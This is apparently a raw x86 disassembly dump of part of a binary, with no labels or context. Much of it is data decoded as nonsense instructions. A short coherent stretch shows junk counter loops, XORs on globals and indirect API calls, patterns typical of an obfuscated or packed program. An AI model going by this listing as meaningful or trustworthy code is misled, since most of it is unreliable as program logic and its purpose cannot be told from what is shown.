  406a90:	shl    BYTE PTR [ecx+0x1e],cl
  406a93:	and    ch,BYTE PTR [eax]
  406a95:	jle    0x406a5a
  406a97:	jg     0x406a5b
  406a99:	inc    edx
  406a9a:	push   es
  406a9b:	inc    DWORD PTR [ebp+0x2d]
  406a9e:	nop
  406a9f:	repnz data16 (bad) 
  406aa2:	or     al,0x24
  406aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aa5:	xchg   esp,eax
  406aa6:	xchg   esi,eax
  406aa7:	push   edx
  406aa8:	sti    
  406aa9:	jo     0x406a38
  406aab:	push   ecx
  406aac:	imul   esp,edi,0x6349810c
  406ab2:	mov    cl,0x82
  406ab4:	retf   0x2ad4
  406ab7:	cmp    al,0x44
  406ab9:	jnp    0x406a80
  406abb:	call   0x76b:0xaf310afd
  406ac2:	cmp    eax,DWORD PTR [ebp-0xb]
  406ac5:	or     al,0xe7
  406ac7:	icebp  
  406ac8:	xor    BYTE PTR [ebp-0x7966de1b],al
  406ace:	add    bl,BYTE PTR [esi-0x724d1113]
  406ad4:	into   
  406ad5:	xchg   BYTE PTR [ecx-0x30],bl
  406ad8:	ins    DWORD PTR es:[edi],dx
  406ad9:	imul   ebx,DWORD PTR [ebx-0x49],0xdbeb5ffd
  406ae0:	addr16 push 0xe8a4d28d
  406ae6:	sahf   
  406ae7:	(bad)  
  406ae9:	mov    al,0xf0
  406aeb:	adc    eax,0x96659f0f
  406af0:	test   eax,0xc98df072
  406af5:	xor    dl,ch
  406af7:	sub    al,0xe3
  406af9:	hlt    
  406afa:	leave  
  406afb:	fwait
  406afc:	mov    ecx,0x55be022c
  406b01:	xor    dl,dh
  406b03:	jmp    0x406b37
  406b05:	mov    dh,0xed
  406b07:	stos   DWORD PTR es:[edi],eax
  406b08:	out    0x40,eax
  406b0a:	mov    eax,DWORD PTR [ecx]
  406b0c:	ins    DWORD PTR es:[edi],dx
  406b0d:	jmp    0x7f36:0xb6514379
  406b14:	xchg   DWORD PTR [esi+0x39],esi
  406b17:	cmp    BYTE PTR [esi-0x71],dl
  406b1a:	add    eax,0x439ed83f
  406b1f:	push   edi
  406b20:	fbstp  TBYTE PTR [ecx-0x1c]
  406b23:	test   ecx,ebx
  406b25:	(bad)  
  406b26:	idiv   ecx
  406b28:	bound  esi,QWORD PTR [edx]
  406b2a:	mov    ebx,0xc565dd8a
  406b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b30:	outs   dx,BYTE PTR ds:[esi]
  406b31:	jns    0x406ac5
  406b33:	ret    0xb3c5
  406b36:	cdq    
  406b37:	push   edx
  406b38:	gs xchg edx,eax
  406b3a:	cld    
  406b3b:	dec    edi
  406b3c:	retf   
  406b3d:	add    eax,0x5e849240
  406b42:	pop    ebx
  406b43:	scas   al,BYTE PTR es:[edi]
  406b44:	dec    eax
  406b45:	jo     0x406b21
  406b47:	push   esi
  406b48:	adc    DWORD PTR [edi+ebx*2],esp
  406b4b:	sub    ebp,ebp
  406b4d:	cld    
  406b4e:	push   ss
  406b4f:	jns    0x406b83
  406b51:	popa   
  406b52:	outs   dx,DWORD PTR ds:[si]
  406b54:	ins    BYTE PTR es:[edi],dx
  406b55:	test   al,0x27
  406b57:	mov    ds:0x42fc8724,al
  406b5c:	dec    esp
  406b5d:	mov    ebx,0xd5937a60
  406b62:	mov    DWORD PTR [ebx],ecx
  406b64:	pop    ds
  406b65:	xor    edi,ebp
  406b67:	fisubr DWORD PTR [edx]
  406b69:	mov    al,0xca
  406b6b:	ja     0x406b36
  406b6d:	pop    esi
  406b6e:	inc    eax
  406b6f:	jle    0x406b18
  406b71:	cmp    DWORD PTR ds:0xb083ab86,esp
  406b77:	je     0x406b65
  406b79:	js     0x406b64
  406b7b:	(bad)  
  406b7c:	jae    0x406b9b
  406b7e:	enter  0x8ab0,0x32
  406b82:	pop    ds
  406b83:	xor    bh,0x96
  406b86:	sub    DWORD PTR [edi+0x18],ebx
  406b89:	mov    fs,edx
  406b8b:	scas   eax,DWORD PTR es:[edi]
  406b8c:	mov    ch,0xd3
  406b8e:	je     0x406b7e
  406b90:	mov    bh,0xe2
  406b92:	or     esp,DWORD PTR [esi]
  406b94:	mov    ds:0x70406977,al
  406b99:	mov    dh,0x7d
  406b9b:	xchg   BYTE PTR [edi-0x53],dl
  406b9e:	mov    WORD PTR [ebx+edi*8+0x48],?
  406ba2:	mov    ecx,0xba39eaf
  406ba7:	jo     0x406b8f
  406ba9:	int    0xc2
  406bab:	gs into 
  406bad:	out    dx,al
  406bae:	(bad)  
  406baf:	leave  
  406bb0:	xor    bl,cl
  406bb2:	or     al,0x64
  406bb4:	mov    edi,0x3941788d
  406bb9:	ret    
  406bba:	dec    ecx
  406bbb:	sub    ch,0x93
  406bbe:	cmp    BYTE PTR [ecx+esi*1-0x5b],bl
  406bc2:	inc    ecx
  406bc3:	sub    DWORD PTR [ebp-0x3a6d6351],0x8110952f
  406bcd:	icebp  
  406bce:	fld    st(4)
  406bd0:	int    0x2e
  406bd2:	pop    ss
  406bd3:	aad    0xed
  406bd5:	xchg   ah,bl
  406bd7:	test   al,0xa
  406bd9:	inc    eax
  406bda:	adc    ch,BYTE PTR [esp+eiz*8+0x36ec8741]
  406be1:	div    ebp
  406be3:	or     ecx,DWORD PTR [edi-0x2e3395b6]
  406be9:	mov    edx,0xc5763599
  406bee:	and    ebp,DWORD PTR [edi+ebx*8-0x5a]
  406bf2:	inc    eax
  406bf3:	out    dx,al
  406bf4:	xchg   BYTE PTR [edx+0x2069e106],bl
  406bfa:	xchg   BYTE PTR [ebx-0x1],al
  406bfd:	test   BYTE PTR [ecx+edx*1],al
  406c00:	pop    ebx
  406c01:	adc    ah,BYTE PTR [ebx]
  406c03:	adc    ebx,DWORD PTR [edi+0x7f08ac3d]
  406c09:	in     eax,dx
  406c0a:	mov    ds:0x2224a392,eax
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	cld    
  406c28:	inc    esp
  406c29:	inc    esi
  406c2a:	xchg   edi,eax
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	xor    eax,0xc28fe990
  406c38:	push   ebx
  406c39:	or     DWORD PTR [ecx+0x13360aa1],edx
  406c3f:	call   0x9d9:0x2baf814d
  406c46:	ins    DWORD PTR es:[edi],dx
  406c47:	and    eax,0xf969562b
  406c4c:	cmp    cl,dl
  406c4e:	fcom   st(2)
  406c50:	lods   al,BYTE PTR ds:[esi]
  406c51:	dec    edi
  406c52:	sub    eax,0x613f7621
  406c57:	mov    ds:0xa439384e,al
  406c5c:	(bad)  
  406c5d:	(bad)  
  406c5e:	sti    
  406c5f:	cmp    eax,0x9fe3bf6f
  406c64:	(bad)  
  406c65:	cmp    al,0x2
  406c67:	fstp   DWORD PTR [esi*8-0x4db59905]
  406c6e:	pop    esi
  406c6f:	int    0x45
  406c71:	and    cl,al
  406c73:	imul   edx,DWORD PTR [edi],0x2
  406c76:	es fucompp 
  406c79:	ins    DWORD PTR es:[edi],dx
  406c7a:	aas    
  406c7b:	push   esp
  406c7c:	adc    DWORD PTR [esi],esi
  406c7e:	not    BYTE PTR [ebx-0x308a1cb8]
  406c84:	lods   eax,DWORD PTR ds:[esi]
  406c85:	dec    esp
  406c86:	sbb    BYTE PTR [eax],ch
  406c88:	mov    ss,WORD PTR [ebx]
  406c8a:	fld    QWORD PTR [edx+0x7db54187]
  406c90:	fstp   TBYTE PTR [ebx+ebx*8]
  406c93:	add    esi,DWORD PTR [edi+0x69]
  406c96:	les    eax,FWORD PTR [ebp+0x5d5599d4]
  406c9c:	(bad)  
  406c9d:	std    
  406c9e:	in     eax,0xe2
  406ca0:	lds    eax,FWORD PTR [esi-0x35]
  406ca3:	dec    eax
  406ca4:	xchg   ecx,eax
  406ca5:	xchg   DWORD PTR ds:[edi+esi*4-0x4c],ebp
  406caa:	mov    dl,0xb1
  406cac:	test   cl,al
  406cae:	jg     0x406c5d
  406cb0:	jne    0x406d19
  406cb2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb4:	adc    DWORD PTR [edx],esp
  406cb6:	add    eax,DWORD PTR [esi]
  406cb8:	push   edi
  406cb9:	stos   BYTE PTR es:[edi],al
  406cba:	ret    
  406cbb:	add    BYTE PTR [esi+esi*2+0x12167860],dh
  406cc2:	in     eax,dx
  406cc3:	and    ah,dh
  406cc5:	and    eax,0xd139941e
  406cca:	cmpxchg ecx,ebp
  406ccd:	hlt    
  406cce:	or     eax,0xb8a311da
  406cd3:	mov    esi,0x629ddf1e
  406cd8:	mov    ds:0xec2a3828,eax
  406cdd:	test   al,0x2d
  406cdf:	scas   eax,DWORD PTR es:[edi]
  406ce0:	aad    0x48
  406ce2:	inc    esp
  406ce3:	bound  esi,QWORD PTR [ebx]
  406ce5:	retf   0x9165
  406ce8:	inc    edi
  406ce9:	mov    dh,0x39
  406ceb:	push   ecx
  406cec:	fsubr  DWORD PTR [ebx+eax*1+0x13f0081b]
  406cf3:	mov    ds:0xe9a95966,al
  406cf8:	pop    ecx
  406cf9:	jnp    0x406c9b
  406cfb:	push   0xfffffff8
  406cfd:	sub    DWORD PTR [ecx-0x1f],ebx
  406d00:	(bad)  
  406d01:	int3   
  406d02:	sub    ebp,DWORD PTR [edi+ebp*4-0x16]
  406d06:	inc    ecx
  406d07:	std    
  406d08:	out    0x1e,al
  406d0a:	mov    esp,0xb74a8874
  406d0f:	or     DWORD PTR [edi+0xc8a7dd1],eax
  406d15:	aas    
  406d16:	mov    esp,0x3bd99b57
  406d1b:	push   0xffffffaf
  406d1d:	aad    0xee
  406d1f:	mov    eax,0xdd54ff79
  406d24:	pop    ebx
  406d25:	mov    ds:0x2b050ccc,al
  406d2a:	fs cmp al,0x90
  406d2d:	jl     0x406ce1
  406d2f:	mov    ebx,0xeecd86de
  406d34:	imul   esp,DWORD PTR [ebx+0x22],0xeb73da9
  406d3b:	sar    ecx,cl
  406d3d:	add    DWORD PTR [ebp-0x5376b40a],edx
  406d43:	mov    ds:0x6998d79c,al
  406d48:	stos   BYTE PTR es:[edi],al
  406d49:	dec    edi
  406d4a:	add    BYTE PTR [ebp+0x68386d4f],0x96
  406d51:	dec    esp
  406d52:	jge    0x406d20
  406d54:	fs sbb esp,0x6b78c560
  406d5b:	mov    eax,ds:0x2c48c969
  406d60:	fmul   st(5),st
  406d62:	pop    es
  406d63:	es ret 
  406d65:	dec    ebp
  406d66:	pop    esi
  406d67:	clc    
  406d68:	pop    ebx
  406d69:	adc    eax,0x6f2e075e
  406d6e:	adc    BYTE PTR [edi+0x46],bh
  406d71:	cld    
  406d72:	(bad)  
  406d74:	(bad)  
  406d75:	xor    eax,0x2d14b346
  406d7a:	or     DWORD PTR [edi],0x17eaa22d
  406d80:	les    ecx,FWORD PTR [ebx-0x24]
  406d83:	pop    edx
  406d84:	xchg   esp,eax
  406d85:	adc    esi,ebp
  406d87:	je     0x406d19
  406d89:	shl    DWORD PTR [eax],cl
  406d8b:	mov    edi,0xb5e27c62
  406d90:	mov    bl,0x23
  406d92:	ja     0x406d15
  406d94:	cmp    eax,0x87a71369
  406d99:	fld    DWORD PTR [eax+0x644fed60]
  406d9f:	mov    ecx,0x5a8dd910
  406da4:	(bad)  
  406da5:	pop    ebx
  406da6:	pop    es
  406da7:	repz add al,0x6b
  406daa:	cmp    BYTE PTR [ecx+ebx*4+0x60ed265b],dl
  406db1:	sub    al,BYTE PTR ds:0x2f6814ae
  406db7:	inc    esi
  406db8:	ds mov esi,0x6d6dd428
  406dbe:	lds    edx,FWORD PTR [eax-0x20fd280]
  406dc4:	mov    eax,0x744d183d
  406dc9:	dec    ecx
  406dca:	fisttp DWORD PTR [ecx-0x9f191d2]
  406dd0:	retf   0x2e6c
  406dd3:	pushf  
  406dd4:	dec    eax
  406dd5:	ror    BYTE PTR [esi-0x74],cl
  406dd8:	aaa    
  406dd9:	repz cmp BYTE PTR [eax],bl
  406ddc:	cdq    
  406ddd:	xor    al,0xa6
  406ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de0:	lea    ebx,[ecx+0x34]
  406de3:	push   es
  406de4:	test   BYTE PTR [ecx+0x9],cl
  406de7:	lea    edi,[edx]
  406de9:	push   edi
  406dea:	(bad)  
  406deb:	pop    edx
  406dec:	or     ah,ch
  406dee:	adc    al,0x42
  406df0:	jb     0x406dee
  406df2:	xchg   BYTE PTR [ebx+0x1e],dl
  406df5:	mov    esi,0xfc1f564
  406dfa:	jp     0x406d80
  406dfc:	jno    0x406d82
  406dfe:	adc    bl,BYTE PTR [edi-0x26cf9bd9]
  406e04:	push   0xf70a99b7
  406e09:	or     ecx,DWORD PTR [edx+0x24]
  406e0c:	scas   eax,DWORD PTR es:[edi]
  406e0d:	add    al,0x2f
  406e0f:	pop    eax
  406e10:	jae    0x406e7f
  406e12:	pusha  
  406e13:	rcr    ecx,1
  406e15:	test   BYTE PTR [edx+edi*4-0x28138789],ah
  406e1c:	aas    
  406e1d:	ret    
  406e1e:	es sbb al,bh
  406e21:	in     al,0x11
  406e23:	fld    TBYTE PTR [esi+0x4c]
  406e26:	dec    edi
  406e27:	dec    eax
  406e28:	mov    esp,0x54156c12
  406e2d:	shr    BYTE PTR [esp+edi*4+0x21853d6e],1
  406e34:	icebp  
  406e35:	out    dx,al
  406e36:	out    0x83,al
  406e38:	test   eax,0xabb5e506
  406e3d:	stos   DWORD PTR es:[edi],eax
  406e3e:	das    
  406e3f:	in     eax,0xa
  406e41:	dec    edi
  406e42:	mov    edi,0x5b3bc980
  406e47:	int    0xb2
  406e49:	int3   
  406e4a:	adc    dl,BYTE PTR [edi-0x5d7d8c4f]
  406e50:	mov    WORD PTR [eax],?
  406e52:	mov    bh,0x85
  406e54:	ror    BYTE PTR [edi],1
  406e56:	add    ch,ah
  406e58:	and    BYTE PTR [edi+0x21d9a7f7],cl
  406e5e:	hlt    
  406e5f:	push   0xffffffc4
  406e61:	or     DWORD PTR [esp+edi*2-0xc91d126],eax
  406e68:	stos   BYTE PTR es:[edi],al
  406e69:	dec    DWORD PTR [ebx+edi*4-0x21d16a7d]
  406e70:	jecxz  0x406e47
  406e72:	in     al,dx
  406e73:	sub    eax,0x9ac17ba7
  406e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e79:	imul   DWORD PTR ds:0xa15ec9b8
  406e7f:	sub    al,0x69
  406e81:	sbb    ah,BYTE PTR [eax+0x1f]
  406e84:	xchg   edx,eax
  406e85:	dec    edx
  406e86:	add    DWORD PTR [ecx+0x1e844a73],ebp
  406e8c:	cld    
  406e8d:	sti    
  406e8e:	out    dx,al
  406e8f:	sbb    cl,ah
  406e91:	ja     0x406e63
  406e93:	adc    eax,0x8aeaa71d
  406e98:	scas   al,BYTE PTR es:[edi]
  406e99:	push   es
  406e9a:	clc    
  406e9b:	push   esi
  406e9c:	sbb    al,BYTE PTR [esi-0x478bbdfc]
  406ea2:	js     0x406e29
  406ea4:	xchg   edi,eax
  406ea5:	sbb    BYTE PTR [eax+0x52],dh
  406ea8:	xchg   edx,eax
  406ea9:	xchg   ebx,eax
  406eaa:	call   0xfb3:0x87819589
  406eb1:	push   ds
  406eb2:	aad    0xfa
  406eb4:	jge    0x406e6e
  406eb6:	test   al,0x64
  406eb8:	adc    esp,edi
  406eba:	cmp    eax,0x4069b96a
  406ebf:	(bad)  
  406ec0:	jg     0x406eaa
  406ec2:	pop    esp
  406ec3:	les    ecx,FWORD PTR [ecx]
  406ec5:	push   ebx
  406ec6:	retf   
  406ec7:	sar    DWORD PTR [eax+0x4f],cl
  406eca:	(bad)  
  406ecb:	popf   
  406ecc:	push   eax
  406ecd:	adc    BYTE PTR [ebp+0x51],bl
  406ed0:	pop    ebx
  406ed1:	mov    al,ds:0xbfad4978
  406ed6:	ins    BYTE PTR es:[edi],dx
  406ed7:	sub    BYTE PTR [edi+0x53b6c66e],dl
  406edd:	pop    es
  406ede:	inc    ecx
  406edf:	mov    BYTE PTR [edi-0x7feeb814],cl
  406ee5:	lock dec esi
  406ee7:	ret    
  406ee8:	fwait
  406ee9:	jl     0x406f02
  406eeb:	ss mov edi,0x9734ce32
  406ef1:	or     ecx,edx
  406ef3:	xor    eax,0x6a6246f5
  406ef8:	das    
  406ef9:	rol    BYTE PTR [ecx],1
  406efb:	adc    eax,0x9aae7958
  406f00:	push   esp
  406f01:	xor    DWORD PTR [edx+0x3],esp
  406f04:	nop
  406f05:	xlat   BYTE PTR ss:[ebx]
  406f07:	cmp    bl,BYTE PTR [eax]
  406f09:	gs push ebx
  406f0b:	xchg   ebp,eax
  406f0c:	push   edx
  406f0d:	mov    edi,0x6595e2d4
  406f12:	push   ss
  406f13:	ins    DWORD PTR es:[edi],dx
  406f14:	pop    ecx
  406f15:	and    ch,cl
  406f17:	cmp    al,0x5a
  406f19:	jecxz  0x406f1b
  406f1b:	fadd   st,st(2)
  406f1d:	popa   
  406f1e:	idiv   BYTE PTR [ebx]
  406f20:	push   ds
  406f21:	in     al,0xac
  406f23:	jno    0x406f86
  406f25:	mov    ecx,0xbafa6ad3
  406f2a:	adc    esi,edx
  406f2c:	push   ds
  406f2d:	das    
  406f2e:	gs and eax,0xf721d62a
  406f34:	stc    
  406f35:	sbb    al,0x81
  406f37:	clc    
  406f38:	daa    
  406f39:	jge    0x6446
  406f3e:	mov    edx,0x710464f7
  406f43:	neg    BYTE PTR [eax-0x11]
  406f46:	jns    0x406edd
  406f48:	push   ecx
  406f49:	or     BYTE PTR [edx],0xd0
  406f4c:	fs sti 
  406f4e:	dec    ebp
  406f4f:	add    eax,0x265d62d1
  406f54:	pushf  
  406f55:	or     bh,ch
  406f57:	(bad)  
  406f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f59:	mov    esp,0x25b24656
  406f5e:	pop    DWORD PTR [eax]
  406f60:	dec    ebx
  406f61:	icebp  
  406f62:	stc    
  406f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f64:	(bad)  
  406f65:	and    DWORD PTR [ebx],ecx
  406f67:	mov    eax,0xc4dee00a
  406f6c:	inc    ebp
  406f6d:	int    0xcf
  406f6f:	adc    esi,ecx
  406f71:	cmp    ch,BYTE PTR [ebp+0xf]
  406f74:	fdivr  st,st(3)
  406f76:	mov    ebx,DWORD PTR [esi+0x18]
  406f79:	sub    dh,BYTE PTR [ebx+esi*8+0x0]
  406f7d:	xlat   BYTE PTR ds:[ebx]
  406f7e:	cmp    al,0xf
  406f80:	pop    esi
  406f81:	iret   
  406f82:	mov    dh,0x9c
  406f84:	cmp    eax,0x2a54b4f6
  406f89:	rol    BYTE PTR [edi+0x61ba27ce],0x9d
  406f90:	lods   al,BYTE PTR ds:[esi]
  406f91:	je     0x406f44
  406f93:	add    DWORD PTR [edi],0x6d
  406f96:	inc    edx
  406f97:	mov    BYTE PTR [edi-0x3c0764e9],0x59
  406f9e:	jbe    0x407000
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430516,0x19
  406fd8:	cmp    DWORD PTR ds:0x430516,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430516,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eb44
  406ffd:	cmp    DWORD PTR ds:0x430516,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430516
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430516,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430516
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430516,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x4305d6,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x4305ca,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee98,0x42eea0
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee90,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee9c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee9c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee9c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee9c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42ec24
  4070a9:	cmp    DWORD PTR ds:0x42ee9c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee9c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee9c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee9c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x4305da,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42eea8,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42eea8
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42eea8,ecx
  4070fe:	cmp    DWORD PTR ds:0x42eea8,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42eea8,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42eea4
  407123:	call   DWORD PTR ds:0x42ec28
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x43053a
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430512,0x17
  407147:	cmp    DWORD PTR ds:0x430512,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430512,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea84
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430512
  407179:	dec    eax
  40717a:	mov    ds:0x430512,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xca96e659
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x4071be
  4071b2:	pop    ecx
  4071b3:	jge    0x407217
  4071b5:	call   0x663a:0xe2139dd
  4071bc:	js     0x40714c
  4071be:	push   ecx
  4071bf:	jg     0x407191
  4071c1:	sbb    bl,0xe4
  4071c4:	(bad)  [esp+edi*2]
  4071c7:	push   0xf87aac01
  4071cc:	push   ebx
  4071cd:	mov    eax,0x4c620295
  4071d2:	jmp    0x4071e1
  4071d4:	jmp    0x16022c4c
  4071d9:	shr    DWORD PTR [esi-0x516016b9],1
  4071df:	mov    BYTE PTR gs:[ecx+0x60d0b7ab],ah
  4071e6:	dec    edi
  4071e7:	adc    eax,0x52d51dc9
  4071ec:	mov    ebx,0x3a6bee6
  4071f1:	cld    
  4071f2:	popa   
  4071f3:	mov    esp,0x574dfa88
  4071f8:	xchg   ecx,eax
  4071f9:	rcr    DWORD PTR [esi+0x209b172e],0xbd
  407200:	sar    BYTE PTR [ebx],1
  407202:	ficomp DWORD PTR [esi-0x5f07229b]
  407208:	inc    esp
  407209:	mov    edx,0xf149aadb
  40720e:	lock pop ebx
  407210:	add    ebx,DWORD PTR [edi-0x71a86cfe]
  407216:	jg     0x407287
  407218:	pop    esp
  407219:	jmp    0x8a5a:0xe04693aa
  407220:	(bad)  
  407221:	out    dx,eax
  407222:	push   ds
  407223:	mov    bh,0x63
  407225:	inc    ebp
  407226:	push   0x2f
  407228:	adc    ah,ch
  40722a:	mov    eax,0xf04927b1
  40722f:	mov    edi,0xcdb6c483
  407234:	push   ecx
  407235:	mov    ds:0x84d3a91c,al
  40723a:	sysret 
  40723c:	jae    0x4072a1
  40723e:	outs   dx,DWORD PTR ds:[esi]
  40723f:	test   al,0xac
  407241:	xchg   esi,eax
  407242:	sub    ebx,DWORD PTR [esi-0x47]
  407245:	mov    bl,BYTE PTR [edx+0x132cce]
  40724b:	push   0xffffffbd
  40724d:	imul   ebx,DWORD PTR [edx+0x50738d5f],0xffffff81
  407254:	sti    
  407255:	int    0xe3
  407257:	cs push esi
  407259:	jmp    0x745c:0xe5726b04
  407260:	or     ch,0xeb
  407263:	mov    esp,0x436846a6
  407268:	mov    ah,0xda
  40726a:	sar    DWORD PTR [ebp-0x60c6352d],cl
  407270:	daa    
  407271:	dec    edx
  407272:	clc    
  407273:	add    al,0xe2
  407275:	scas   al,BYTE PTR es:[edi]
  407276:	xchg   ecx,eax
  407277:	xchg   edx,eax
  407278:	inc    esi
  407279:	sub    dl,dh
  40727b:	sub    eax,DWORD PTR [eax+eax*1]
  40727e:	cmp    al,0x5d
  407280:	mov    edx,0x17665dff
  407285:	and    eax,0xf62a0b15
  40728a:	shl    DWORD PTR [edx],1
  40728c:	aad    0x7d
  40728e:	jo     0x4072bd
  407290:	mov    bl,0xc3
  407292:	xor    al,0x80
  407294:	xchg   ebp,eax
  407295:	retf   
  407296:	add    ah,BYTE PTR ds:0x360e91e5
  40729c:	repz xor eax,0xb2744942
  4072a2:	pushf  
  4072a3:	mov    esi,0xe3cce4a4
  4072a8:	fisub  DWORD PTR [eax]
  4072aa:	mov    bh,0xe4
  4072ac:	jae    0x407314
  4072ae:	add    al,0x7d
  4072b0:	or     BYTE PTR [esi],ch
  4072b2:	fs out dx,al
  4072b4:	daa    
  4072b5:	pushf  
  4072b6:	sbb    BYTE PTR [ecx],ch
  4072b8:	out    0x60,eax
  4072ba:	int    0x5c
  4072bc:	inc    DWORD PTR [edi-0x14]
  4072bf:	add    ebx,ecx
  4072c1:	pop    edi
  4072c2:	aad    0x3f
  4072c4:	aas    
  4072c5:	mov    fs,WORD PTR [esi+0xe]
  4072c8:	mov    ch,0x2
  4072ca:	mov    bl,dh
  4072cc:	sub    BYTE PTR [edi+0xd2ee9c3],bl
  4072d2:	retf   0x547e
  4072d5:	inc    edi
  4072d6:	mov    edx,DWORD PTR [edx-0x35]
  4072d9:	or     esi,DWORD PTR [edx-0x3e]
  4072dc:	jecxz  0x407261
  4072de:	fabs   
  4072e0:	arpl   WORD PTR [edi],sp
  4072e2:	rol    BYTE PTR [ebp-0x50ba4a0c],1
  4072e8:	mov    esi,0x3b1911a
  4072ed:	mov    ecx,fs
  4072ef:	xor    DWORD PTR [edi+edi*2-0x30],edx
  4072f3:	mov    esp,0xe642cf15
  4072f8:	fimul  WORD PTR [edi+0xd]
  4072fb:	push   edi
  4072fc:	vpsubd ymm4,ymm7,ymm4
  407300:	push   eax
  407301:	mov    cl,dl
  407303:	test   DWORD PTR [edi+0x49],esi
  407306:	adc    BYTE PTR [ecx+0x2],al
  407309:	ficom  DWORD PTR ds:0x7c321056
  40730f:	add    ecx,DWORD PTR [edx]
  407311:	jmp    0x4072a4
  407313:	inc    ebx
  407314:	or     DWORD PTR [ebx-0x1e7e07bb],0xffffffef
  40731b:	add    BYTE PTR [bx+si],al
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x4305c6
  40732a:	sub    DWORD PTR ds:0x43051a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e7e2,0x43052a
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x430536,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
